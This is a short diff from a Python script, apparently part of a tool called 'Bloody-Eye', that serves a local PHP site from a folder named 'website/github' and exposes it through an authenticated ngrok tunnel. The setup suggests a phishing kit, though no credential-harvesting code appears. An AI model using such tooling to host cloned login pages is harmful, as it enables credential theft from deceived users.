@@ -993,9 +993,11 @@ exit();
       with open("log","w") as phplog:
         Popen(("php","-S","localhost:6060","-t","../Bloody-Eye/website/github"),stderr=phplog,stdout=phplog)
       print("")
+      global token
+      link = ngrok.connect(6060,"http",auth_token=token)
       time.sleep(0.07)
       print(Fore.RED+" ["+Fore.WHITE+"!"+Fore.RED+"]"+" Php Server Has Started on Port 6060")
-      link = ngrok.connect(6060,"http")
+
     
     
     
